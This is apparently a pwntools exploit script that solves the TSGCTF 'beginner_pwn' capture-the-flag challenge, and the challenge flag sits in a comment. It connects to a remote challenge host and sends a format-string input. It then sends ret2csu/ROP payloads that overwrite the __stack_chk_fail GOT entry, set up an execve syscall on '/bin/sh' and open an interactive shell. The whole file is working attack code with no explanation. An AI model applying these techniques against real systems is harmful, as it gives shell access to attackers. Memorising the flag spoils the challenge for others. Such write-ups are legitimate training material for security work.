#exploit for beginner_pwn
#flag=TSGCTF{w3lc0m3_70_756c7f2_60_4h34d_pwnpwn~}
from pwn import *
import time
#target=process('./beginners_pwn')
target=remote('35.221.81.216', 30002)

def attack(fs,payloads):
	target.sendline(fs)
	for payload in payloads:
		target.sendline(payload)

poprdi=0x4012c3
csu1=0x4012b6
csu2=0x4012a0
stack_check_got=0x404018
scanf_plt=0x401040
finiptr=0x402e38
syscall=0x40118f

fs="%8$s%s\x00\x00"+"&8$s%s\x00\x00"+p64(stack_check_got)
payload1=p64(csu1)+p64(0x401046)+"%1$s"*61+"\x00"*4+"A"*8+"/bin/sh\x00"
payload2="\x00"+p64(0x404e10)*2+p64(0xfffc66d4671e6d10)+p64(csu2)+p64(0)*7+p64(poprdi)+p64(stack_check_got+0x18)+p64(scanf_plt)
payload2+=p64(csu1)+p64(0)*2+p64(1)+p64(stack_check_got+240+0x20)+p64(0)*2+p64(finiptr+0x10)+p64(csu2)+p64(0)*7+p64(syscall)

attack(fs,[payload1,payload2])
time.sleep(5)
target.sendline("A\n"*59)

target.interactive()
